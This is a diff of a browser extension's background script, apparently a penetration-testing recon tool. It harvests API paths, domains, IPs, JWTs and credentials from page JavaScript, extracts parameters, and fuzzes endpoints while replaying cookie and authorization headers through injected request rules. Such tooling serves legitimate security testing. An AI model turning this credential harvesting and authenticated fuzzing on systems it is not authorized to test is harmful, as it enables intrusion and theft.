-  if (msg.action === 'clear') { chrome.tabs.query({ active: true, currentWindow: true }, ([t]) => { if (t) { const fresh = { apis: [], fw: [], cfg: {}, jsN: 0, url: '', domains: [], ips: [], jwts: [], creds: [], storageItems: [], runtimeReqs: [], bodyParams: [], wap: [] }; tabs.set(t.id, fresh) }; badge(t?.id) }); sendResponse({ ok: true }) }
+  if (msg.action === 'clear') {
+    chrome.tabs.query({ active: true, currentWindow: true }, ([t]) => {
+      if (t) {
+        const fresh = { apis: [], fw: [], cfg: {}, jsN: 0, url: '', domains: [], ips: [], jwts: [], creds: [], storageItems: [], runtimeReqs: [], bodyParams: [], wap: [], phones: [], githubRepos: [], params: [], processing: false }
+        tabs.set(t.id, fresh)
+        badge(t.id)
+        // 清空当前 tab 的 in-flight JS 下载集合, 避免旧任务完成后回填
+        getFetching(t.id).clear()
+      }
+    })
+    // 修复: 之前没清持久化, 下次开 popup 又把 lastFuzzRes / lastData 拉回来显示, 看起来"莫名有记录"
+    chrome.storage.local.remove(['lastData', 'lastFuzzRes', 'lastFuzzTotal', 'fuzzTruncated', 'fuzzTruncatedCount'])
+    sendResponse({ ok: true })
+  }
 })
 
 // === 网站解析 (ICP / IP / 权重) ===
@@ -281,14 +650,42 @@ function processInline(t, scripts) {
     }
   }
   scripts.forEach(s => Object.assign(t.cfg, fwDetect.extractConfig(s) || {}))
+  // 采纳 ParamX: JS 参数全量提取
+  if (PARAM_EXTRACTOR_LOADED && typeof self.ParamExtractor !== 'undefined') {
+    const pe = new self.ParamExtractor()
+    scripts.forEach(s => mergeParams(t, pe.extract(s)))
+  }
+}
+
+// 合并提取到的参数到 tab 状态 (去重 + 优先级/来源合并)
+function mergeParams(t, extracted) {
+  if (!extracted || !extracted.length) return
+  if (!t.params) t.params = []
+  const seen = new Set(t.params.map(p => p.value))
+  for (const p of extracted) {
+    if (t.params.length >= 1200) break
+    if (!seen.has(p.value)) {
+      seen.add(p.value); t.params.push(p)
+    } else {
+      const ex = t.params.find(x => x.value === p.value)
+      if (ex) {
+        if (p.priority > ex.priority) ex.priority = p.priority
+        if (p.category !== 'general' && ex.category === 'general') ex.category = p.category
+        if (p.source && !ex.source.includes(p.source)) ex.source = ex.source + ',' + p.source
+        const tags = new Set([...(ex.tags||[]), ...(p.tags||[])])
+        ex.tags = [...tags]
+      }
+    }
+  }
 }
 
 // === 下载外部JS (CORS降级: fetch→chrome.scripting注入) ===
 async function downloadJS(tabId, tasks) {
   const t = T(tabId)
+  t.processing = true
   const fetching = getFetching(tabId)
-  // filter out already-fetching URLs
-  const fresh = (tasks || []).filter(u => u.startsWith('http') && !fetching.has(u) && !isThirdParty(u))
+  // filter out already-fetching AND already-downloaded URLs (跨 tab 去重, 避免 webRequest + content.js 双路重复)
+  const fresh = (tasks || []).filter(u => u.startsWith('http') && !fetching.has(u) && !downloadedUrls.has(u) && !isThirdParty(u))
   if (!fresh.length) return
   fresh.forEach(u => fetching.add(u))
   const apiFilter = new SvAPIFilter(), fwDetect = new SvFwDetect()
@@ -312,9 +709,20 @@ async function downloadJS(tabId, tasks) {
       for (const d of domains) { if (!seenDomains.has(d)) { seenDomains.add(d); t.domains.push(d) } }
       for (const ip of ips) { if (!seenIps.has(ip)) { seenIps.add(ip); t.ips.push(ip) } }
 
+      // 采纳 ParamX: 从 JS 全量提取参数 (对象属性/解构/函数参数/URL参数/路由参数等)
+      if (PARAM_EXTRACTOR_LOADED && typeof self.ParamExtractor !== 'undefined') {
+        try {
+          const extracted = new self.ParamExtractor().extract(text)
+          mergeParams(t, extracted)
+        } catch (e) { /* skip */ }
+      }
+
       t.jsN = (t.jsN || 0) + 1; badge(tabId)
+      // 标记已下载, 避免 webRequest 二次触发 + 跨 tab 重复
+      if (text) downloadedUrls.add(url)
     } catch (e) { /* skip */ }
   }
+  t.processing = false
   badge(tabId)
 }
 
@@ -368,7 +776,7 @@ function badge(tabId) {
   const t = tabs.get(tabId)
   if (!t) return
   let total = 0
-  const fields = ['apis', 'domains', 'ips', 'jwts', 'creds', 'storageItems', 'runtimeReqs', 'wap']
+  const fields = ['apis', 'domains', 'ips', 'jwts', 'creds', 'storageItems', 'runtimeReqs', 'wap', 'phones', 'githubRepos']
   for (const f of fields) { if (t[f]) total += t[f].length }
   const text = total > 0 ? (total > 999 ? '1k+' : String(total)) : ''
   chrome.action.setBadgeText({ text, tabId })
@@ -434,6 +842,7 @@ async function ensureOffscreen() {
 // declarativeNetRequest 动态 Header 注入
 // ============================================================
 let _headerRuleId = 100
+const _headerRuleIds = new Set() // 跟踪所有已添加的规则 id, 保证并发下清理安全
 async function injectHeadersForDomain(hostname, headers) {
   if (!hostname || !headers || !Object.keys(headers).length) return
   try {
@@ -448,6 +857,7 @@ async function injectHeadersForDomain(hostname, headers) {
     if (!requestHeaders.length) return
 
     const ruleId = _headerRuleId++
+    _headerRuleIds.add(ruleId)
     await chrome.declarativeNetRequest.updateDynamicRules({
       addRules: [{
         id: ruleId,
@@ -455,7 +865,8 @@ async function injectHeadersForDomain(hostname, headers) {
         action: { type: 'modifyHeaders', requestHeaders },
         condition: { urlFilter: `*://${hostname}/*`, resourceTypes: ['xmlhttprequest','other'] }
       }],
-      removeRuleIds: [ruleId - 1] // remove previous rule
+      // 仅保留最新一条 (并发场景下旧规则可能属于其他 in-flight 请求, 但值相同, 无影响)
+      removeRuleIds: [..._headerRuleIds].filter(id => id !== ruleId)
     })
     // Store for cleanup
     self.__dnrRuleId = ruleId
@@ -466,9 +877,9 @@ async function injectHeadersForDomain(hostname, headers) {
 
 async function removeHeaderInjection() {
   try {
-    const ids = []
-    if (self.__dnrRuleId) ids.push(self.__dnrRuleId)
+    const ids = [..._headerRuleIds]
     if (ids.length) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: ids })
+    _headerRuleIds.clear()
     self.__dnrRuleId = 0
   } catch(e) {}
 }
@@ -496,7 +907,7 @@ async function fuzzURL(url, method, headers) {
     try {
       const r = await fetch(url, { method: methodOverride, headers: { ...fetchHeaders }, body: bodyOverride, mode: 'cors' })
       const text = await r.text()
-      return { url, method: methodOverride, status: r.status, size: text.length, body: text.substring(0, 2000), contentType: r.headers.get('content-type')||'' }
+      return { url, method: methodOverride, status: r.status, size: text.length, body: text.substring(0, 50000), contentType: r.headers.get('content-type')||'' }
     } catch(e) { return null }
   }
 
@@ -524,20 +935,37 @@ async function fuzzURL(url, method, headers) {
   const hasAuth = fetchHeaders['authorization'] || fetchHeaders['cookie'] ||
     Object.keys(fetchHeaders).some(k => k.toLowerCase() === 'authorization' || k.toLowerCase() === 'cookie')
 
-  if (res && res.status === 0 && hasAuth) {
+  // 修复: 原门控 res.status === 0 永不可达 (fetch 失败时 _doDirectFetch 返回 null 而非 status 0),
+  // 导致 offscreen Cookie 通道从未生效。改为 res 为 null 或 status 0 且带认证头时走 offscreen。
+  if ((!res || res.status === 0) && hasAuth) {
     try {
       const offscreenReady = await ensureOffscreen()
       if (offscreenReady) {
+        // 显式 Cookie 头: fetch API 禁止 JS 设置 Cookie, 需经 declarativeNetRequest 注入
+        // 后由 offscreen 请求携带 (请求结束后立即移除规则, 避免影响页面正常流量)
+        const cookieKey = Object.keys(fetchHeaders).find(k => k.toLowerCase() === 'cookie')
+        let dnrInjected = false
+        if (cookieKey && fetchHeaders[cookieKey]) {
+          try {
+            const hostname = new URL(url).hostname
+            if (hostname) {
+              await injectHeadersForDomain(hostname, { cookie: fetchHeaders[cookieKey] })
+              dnrInjected = true
+              delete fetchHeaders[cookieKey]
+            }
+          } catch(e) {}
+        }
         const resp = await chrome.runtime.sendMessage({
           action: 'offscreenFetch',
           id: Date.now(),
           url, method: method, headers: fetchHeaders, body: body,
           timeout: 8000
         })
+        if (dnrInjected) { try { await removeHeaderInjection() } catch(e) {} }
         if (resp?.success && resp.data && resp.data.status > 0) {
           const r = resp.data
           const fp = (RESP_FP_LOADED ? new ResponseFingerprint() : new SvFingerprint()).analyze(r.body || '', r.status)
-          return { url, method: r.status === 0 ? method : method, status: r.status, size: r.size || 0, body: r.body?.substring(0, 2000) || '', contentType: r.contentType || '', fp }
+          return { url, method: method, status: r.status, size: r.size || 0, body: r.body?.substring(0, 50000) || '', contentType: r.contentType || '', fp }
         }
       }
     } catch(e) {
@@ -558,7 +986,7 @@ async function fuzzURL(url, method, headers) {
         const text = await fetchWithFallback(_tabId, url, fetchHeaders)
         if (text) {
           const fp = (RESP_FP_LOADED ? new ResponseFingerprint() : new SvFingerprint()).analyze(text, 200)
-          return { url, method: tryMethod, status: 200, size: text.length, body: text.substring(0, 2000), contentType: 'text/html', fp }
+          return { url, method: tryMethod, status: 200, size: text.length, body: text.substring(0, 50000), contentType: 'text/html', fp }
         }
       } catch(e2) {}
     }
@@ -571,7 +999,7 @@ chrome.tabs.onRemoved.addListener(id => { tabs.delete(id); fetchingUrls.delete(i
 // ============================================================
 // TideFinger 指纹加载 (5334条header关键词, 207KB)
 // ============================================================
-let TIDE_FP_LOADED = false, RESP_FP_LOADED = false
+let TIDE_FP_LOADED = false, RESP_FP_LOADED = false, PARAM_EXTRACTOR_LOADED = false
 try {
   importScripts('filters/tide-fingerprint.js')
   TIDE_FP_LOADED = true
@@ -582,6 +1010,11 @@ try {
   RESP_FP_LOADED = true
   console.log('[DesJsFinder] ResponseFingerprint loaded')
 } catch(e) { console.warn('ResponseFingerprint load failed:', e) }
+try {
+  importScripts('filters/param-extract.js')
+  PARAM_EXTRACTOR_LOADED = true
+  console.log('[DesJsFinder] ParamExtractor loaded')
+} catch(e) { console.warn('ParamExtractor load failed:', e) }
 
 // 头指纹配置 (TideFinger升级版)
 const HEADER_FPS = [
@@ -698,6 +1131,8 @@ if (chrome.webRequest) {
     details => {
       const { tabId, url, type } = details
       if (type !== 'script' || tabId < 0 || !url.startsWith('http') || isThirdParty(url)) return
+      // 跨 tab 去重: content.js passive 已下载过的 JS, webRequest 不再重复触发
+      if (downloadedUrls.has(url)) return
       const fetching = getFetching(tabId)
       if (fetching.has(url)) return
       fetching.add(url)
